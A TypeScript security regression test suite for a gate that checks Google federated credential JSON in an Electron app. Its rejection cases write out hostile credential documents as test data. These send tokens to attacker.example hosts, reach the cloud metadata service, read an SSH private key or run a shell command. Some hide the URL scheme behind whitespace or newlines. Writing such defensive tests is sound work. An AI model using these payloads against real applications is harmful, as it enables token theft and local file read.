import { describe, it, expect } from "bun:test"
import { assertFederatedCredentialAllowed } from "./credential-policy.ts"

/**
 * Security regression suite.
 *
 * `external_account` / `impersonated_service_account` documents are the only
 * credential shapes whose CONTENTS decide which URL google-auth-library calls,
 * which headers it sends, and which local file it reads. The library validates
 * none of it (the `validateGoogleAPIsUrl` check older majors performed on
 * `token_url` is gone from v11), so a credentials JSON the user pastes into the
 * Service Account tab was, before this gate, an arbitrary outbound request plus
 * an arbitrary file read issued by the unsandboxed Electron main process.
 *
 * Every `rejects` case below is an exploit that worked. Every `allows` case is a
 * real document shape that must keep working — the gate is worthless if it is
 * so strict that people turn it off.
 */
describe("assertFederatedCredentialAllowed", () => {
  const allow = (doc: unknown): void => {
    expect(() => {
      assertFederatedCredentialAllowed(doc)
    }).not.toThrow()
  }
  const reject = (doc: unknown, contains: string): void => {
    expect(() => {
      assertFederatedCredentialAllowed(doc)
    }).toThrow(new RegExp(contains.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")))
  }

  // -------------------------------------------------------------------------
  // Documents the gate must not touch
  // -------------------------------------------------------------------------

  it("ignores a service-account key", () => {
    // A JWT is built from named fields; nothing in the document steers a
    // request, and the auth_uri it carries is never called.
    allow({
      type: "service_account",
      client_email: "sa@p.iam.gserviceaccount.com",
      private_key: "-----BEGIN PRIVATE KEY-----",
      auth_uri: "https://accounts.google.com/o/oauth2/auth",
      token_uri: "https://oauth2.googleapis.com/token",
    })
  })

  it("ignores an authorized_user document", () => {
    allow({
      type: "authorized_user",
      client_id: "id.apps.googleusercontent.com",
      client_secret: "secret",
      refresh_token: "1//refresh",
    })
  })

  it("ignores a document with no type at all", () => {
    allow({ hello: "world" })
    allow(null)
    allow("not an object")
  })

  // -------------------------------------------------------------------------
  // Federated documents that must keep working
  // -------------------------------------------------------------------------

  it("allows the workforce-pool document `gcloud auth application-default login` writes", () => {
    allow({
      type: "external_account_authorized_user",
      audience: "//iam.googleapis.com/locations/global/workforcePools/pool/providers/prov",
      refresh_token: "1//refresh",
      token_url: "https://sts.googleapis.com/v1/oauthtoken",
      token_info_url: "https://sts.googleapis.com/v1/introspect",
      client_id: "id.apps.googleusercontent.com",
      client_secret: "secret",
      universe_domain: "googleapis.com",
    })
  })

  it("allows an impersonated document whose source is an authorized_user", () => {
    allow({
      type: "impersonated_service_account",
      service_account_impersonation_url:
        "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sa@p.iam.gserviceaccount.com:generateAccessToken",
      delegates: [],
      source_credentials: {
        type: "authorized_user",
        client_id: "id.apps.googleusercontent.com",
        client_secret: "secret",
        refresh_token: "1//refresh",
      },
    })
  })

  it("does not fail an impersonated document whose source is a service-account key", () => {
    // Over-blocking regression: a nested key legitimately carries
    // accounts.google.com URLs, and the library never requests them. Sweeping
    // the parent's URLs must not reach into source_credentials.
    allow({
      type: "impersonated_service_account",
      service_account_impersonation_url:
        "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sa@p.iam.gserviceaccount.com:generateAccessToken",
      source_credentials: {
        type: "service_account",
        client_email: "sa@p.iam.gserviceaccount.com",
        private_key: "-----BEGIN PRIVATE KEY-----",
        auth_uri: "https://accounts.google.com/o/oauth2/auth",
        client_x509_cert_url: "https://www.googleapis.com/robot/v1/metadata/x509/sa",
      },
    })
  })

  it("allows regional Google endpoints", () => {
    allow({
      type: "external_account_authorized_user",
      refresh_token: "1//refresh",
      token_url: "https://sts.us-east1.rep.googleapis.com/v1/oauthtoken",
    })
  })

  // -------------------------------------------------------------------------
  // Exfiltration: token_url and friends
  // -------------------------------------------------------------------------

  it("rejects a token_url on an attacker's host", () => {
    // The original exploit: the subject token (whatever credential_source
    // produced) is POSTed straight to this URL.
    reject(
      {
        type: "external_account",
        audience: "//iam.googleapis.com/x",
        token_url: "https://collector.attacker.example/sts",
      },
      "collector.attacker.example",
    )
  })

  it("rejects a plaintext http token_url even on a Google host", () => {
    reject(
      {
        type: "external_account",
        token_url: "http://sts.googleapis.com/v1/token",
      },
      "https://",
    )
  })

  it("rejects a userinfo-prefixed URL that only looks like Google", () => {
    // `https://sts.googleapis.com@attacker.example/` resolves to
    // attacker.example; a substring check would have passed it.
    reject(
      {
        type: "external_account",
        token_url: "https://sts.googleapis.com@attacker.example/sts",
      },
      "credentials in the URL",
    )
  })

  it("rejects a hostname that merely ends with the Google domain as a substring", () => {
    reject(
      {
        type: "external_account",
        token_url: "https://sts.googleapis.com.attacker.example/sts",
      },
      "sts.googleapis.com.attacker.example",
    )
  })

  it("rejects a foreign service_account_impersonation_url", () => {
    reject(
      {
        type: "external_account",
        token_url: "https://sts.googleapis.com/v1/token",
        service_account_impersonation_url: "https://attacker.example/impersonate",
      },
      "attacker.example",
    )
  })

  it("rejects a foreign cloud_resource_manager_url", () => {
    // Reached by `auth.getProjectId()` — and it carries a live Google access
    // token, so this one leaks the token itself.
    reject(
      {
        type: "external_account",
        token_url: "https://sts.googleapis.com/v1/token",
        cloud_resource_manager_url: "https://attacker.example/projects/",
      },
      "attacker.example",
    )
  })

  it("rejects an endpoint override on an impersonated document", () => {
    // `Impersonated` spreads the whole JSON into its options, so `endpoint`
    // redirects generateAccessToken/signBlob wherever the document says.
    reject(
      {
        type: "impersonated_service_account",
        endpoint: "https://attacker.example",
        service_account_impersonation_url:
          "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sa@p.iam.gserviceaccount.com:generateAccessToken",
        source_credentials: { type: "authorized_user", refresh_token: "1//r" },
      },
      "attacker.example",
    )
  })

  it("rejects a URL hidden in a nested object", () => {
    reject(
      {
        type: "external_account",
        service_account_impersonation: { some_future_url: "https://attacker.example/x" },
      },
      "attacker.example",
    )
  })

  // -------------------------------------------------------------------------
  // The universe_domain back door
  // -------------------------------------------------------------------------

  it("rejects a universe_domain that redirects the DEFAULT token URL", () => {
    // With no token_url the library builds `https://sts.{universeDomain}/v1/token`,
    // so a document with no URL in it at all still reaches attacker.example.
    reject(
      {
        type: "external_account",
        audience: "//iam.googleapis.com/x",
        universe_domain: "attacker.example",
      },
      "universe_domain",
    )
  })

  // -------------------------------------------------------------------------
  // credential_source: SSRF, arbitrary file read, process execution
  // -------------------------------------------------------------------------

  it("rejects a URL-sourced subject token (SSRF from the main process)", () => {
    reject(
      {
        type: "external_account",
        token_url: "https://sts.googleapis.com/v1/token",
        credential_source: {
          url: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
          headers: { "Metadata-Flavor": "Google" },
          format: { type: "json", subject_token_field_name: "access_token" },
        },
      },
      "credential_source",
    )
  })

  it("rejects a file-sourced subject token (arbitrary local file read)", () => {
    reject(
      {
        type: "external_account",
        token_url: "https://sts.googleapis.com/v1/token",
        credential_source: { file: "/Users/victim/.ssh/id_rsa", format: { type: "text" } },
      },
      "credential_source",
    )
  })

  it("rejects an executable-sourced subject token", () => {
    reject(
      {
        type: "external_account",
        token_url: "https://sts.googleapis.com/v1/token",
        credential_source: { executable: { command: "/bin/sh -c whoami" } },
      },
      "credential_source",
    )
  })

  it("rejects AWS environment sourcing", () => {
    reject(
      {
        type: "external_account",
        token_url: "https://sts.googleapis.com/v1/token",
        credential_source: {
          environment_id: "aws1",
          region_url: "http://169.254.169.254/latest/meta-data/placement/availability-zone",
          regional_cred_verification_url: "https://sts.{region}.amazonaws.com",
        },
      },
      "credential_source",
    )
  })

  // -------------------------------------------------------------------------
  // The impersonation chain
  // -------------------------------------------------------------------------

  it("rejects a foreign URL one level down the source_credentials chain", () => {
    reject(
      {
        type: "impersonated_service_account",
        service_account_impersonation_url:
          "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sa@p.iam.gserviceaccount.com:generateAccessToken",
        source_credentials: {
          type: "external_account",
          token_url: "https://collector.attacker.example/sts",
        },
      },
      "collector.attacker.example",
    )
  })

  it("rejects a gdch_service_account source, whose client honours its own token_uri", () => {
    reject(
      {
        type: "impersonated_service_account",
        service_account_impersonation_url:
          "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sa@p.iam.gserviceaccount.com:generateAccessToken",
        source_credentials: {
          type: "gdch_service_account",
          token_uri: "https://attacker.example/token",
        },
      },
      "unsupported type",
    )
  })

  it("rejects source_credentials that is not an object", () => {
    reject(
      {
        type: "impersonated_service_account",
        service_account_impersonation_url: "https://iamcredentials.googleapis.com/v1/x:generateAccessToken",
        source_credentials: "not-an-object",
      },
      "not a JSON object",
    )
  })

  it("never quotes secret material in its error messages", () => {
    const secret = "1//super-secret-refresh-token"
    let message = ""
    try {
      assertFederatedCredentialAllowed({
        type: "external_account",
        refresh_token: secret,
        client_secret: "shhh",
        token_url: "https://attacker.example/sts",
      })
    } catch (err) {
      message = err instanceof Error ? err.message : String(err)
    }
    expect(message).toContain("attacker.example")
    expect(message).not.toContain(secret)
    expect(message).not.toContain("shhh")
  })
})

/**
 * Bypasses of the FIRST version of this gate, both demonstrated live against
 * google-auth-library 11 by an independent verifier — the gate was in place and
 * the exfiltration still worked.
 */
describe("assertFederatedCredentialAllowed - detector/parser agreement", () => {
  const reject = (doc: unknown): void => {
    expect(() => {
      assertFederatedCredentialAllowed(doc)
    }).toThrow()
  }

  const external = (tokenUrl: string) => ({
    type: "external_account",
    audience: "//iam.googleapis.com/projects/1/locations/global/workloadIdentityPools/p/providers/x",
    subject_token_type: "urn:ietf:params:oauth:token-type:jwt",
    token_url: tokenUrl,
  })

  // Bypass A. The WHATWG parser strips leading/trailing C0-or-space and every
  // embedded tab/CR/LF BEFORE reading the scheme, so each of these is a working
  // http:// URL to gaxios while failing an anchored `^scheme://` regex. The
  // live proof used " http://127.0.0.1:PORT/sts" and received the victim's
  // refresh_token and client_secret in cleartext.
  it("rejects a token_url hidden behind a leading space", () => {
    reject(external(" http://attacker.example/sts"))
  })

  it("rejects a token_url hidden behind a leading tab or newline", () => {
    reject(external("\thttp://attacker.example/sts"))
    reject(external("\nhttp://attacker.example/sts"))
  })

  it("rejects a token_url with a scheme split by an embedded newline", () => {
    reject(external("ht\ntps://attacker.example/sts"))
    reject(external("h\rttp://attacker.example/sts"))
  })

  it("still rejects the plain unobfuscated case", () => {
    reject(external("https://attacker.example/sts"))
  })

  // Bypass B. `Impersonated` inherits universeDomain from its SOURCE client when
  // the parent sets none, then derives https://iamcredentials.${universeDomain}
  // and POSTs :generateAccessToken there carrying the victim's live access token
  // as a Bearer. A nested authorized_user is not a federated type, so the
  // original gate returned early and never looked at it.
  it("rejects a hostile universe_domain on a nested authorized_user", () => {
    reject({
      type: "impersonated_service_account",
      service_account_impersonation_url:
        "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sa@p.iam.gserviceaccount.com:generateAccessToken",
      source_credentials: {
        type: "authorized_user",
        client_id: "cid",
        client_secret: "csec",
        refresh_token: "1//victim",
        universe_domain: "attacker.example",
      },
    })
  })

  it("rejects a hostile token_uri on a nested service-account key", () => {
    // The nested JWT client POSTs its signed assertion to token_uri.
    reject({
      type: "impersonated_service_account",
      service_account_impersonation_url:
        "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sa@p.iam.gserviceaccount.com:generateAccessToken",
      source_credentials: {
        type: "service_account",
        client_email: "sa@p.iam.gserviceaccount.com",
        private_key: "-----BEGIN PRIVATE KEY-----\nx\n-----END PRIVATE KEY-----\n",
        token_uri: "https://attacker.example/token",
      },
    })
  })

  it("still allows a genuine impersonation chain over a real service-account key", () => {
    // Regression guard on the fix itself: sweeping the nested node must not
    // reject the accounts.google.com auth_uri that every issued key carries.
    expect(() => {
      assertFederatedCredentialAllowed({
        type: "impersonated_service_account",
        service_account_impersonation_url:
          "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sa@p.iam.gserviceaccount.com:generateAccessToken",
        source_credentials: {
          type: "service_account",
          project_id: "p",
          client_email: "sa@p.iam.gserviceaccount.com",
          private_key: "-----BEGIN PRIVATE KEY-----\nx\n-----END PRIVATE KEY-----\n",
          auth_uri: "https://accounts.google.com/o/oauth2/auth",
          token_uri: "https://oauth2.googleapis.com/token",
          auth_provider_x509_cert_url: "https://www.googleapis.com/oauth2/v1/certs",
          client_x509_cert_url:
            "https://www.googleapis.com/robot/v1/metadata/x509/sa%40p.iam.gserviceaccount.com",
          universe_domain: "googleapis.com",
        },
      })
    }).not.toThrow()
  })
})
